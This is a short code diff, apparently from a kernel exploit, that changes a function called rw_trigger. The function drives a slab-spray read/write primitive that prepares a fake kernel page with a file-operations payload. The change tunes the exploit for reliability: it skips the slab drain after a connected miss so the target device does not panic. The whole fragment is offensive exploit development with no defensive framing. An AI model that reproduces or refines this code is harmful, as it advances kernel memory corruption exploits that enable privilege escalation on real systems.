@@ -898,6 +898,7 @@ int rw_page_ok(void) {
 }
 
 int rw_trigger(uintptr_t parent, uintptr_t target) {
+  static int previous_route_connected;
   pselect_child_node = 1;
   uintptr_t value = parent;
   if (parent == RWF_SELF_PAGE) {
@@ -905,7 +906,16 @@ int rw_trigger(uintptr_t parent, uintptr_t target) {
     pselect_value_page_base = 1;
   }
   set_pselect_write_mode(target, value, 3);
-  slab_drain();
+  /* A connected route can dirty the spray page's struct-page state even
+   * when the subsequent owner scan misses.  A full fork/kill slab drain on
+   * the next round then puts memory pressure on that page and panics CZG1.
+   * Keep the live carrier and retry without the pressure wave; the channel
+   * repair path restores every tracked spray page after installation. */
+  if (previous_route_connected && getenv("GL_DEFER_CLOSE")) {
+    pr_info("rw trigger: skipping slab drain after connected miss\n");
+  } else {
+    slab_drain();
+  }
   uintptr_t base = prepare_good_kernel_page(PAGE_PAYLOAD_FOPS);
   if (!base)
     pr_error("rw trigger: page prepare failed\n");
@@ -914,6 +924,7 @@ int rw_trigger(uintptr_t parent, uintptr_t target) {
   atomic_store(&consumer_success, 0);
   run_main_route_threads();
   int ok = atomic_load(&consumer_success) > 0;
+  previous_route_connected = ok;
   clear_pselect_write();
   pselect_value_page_base = 0;
   return ok;
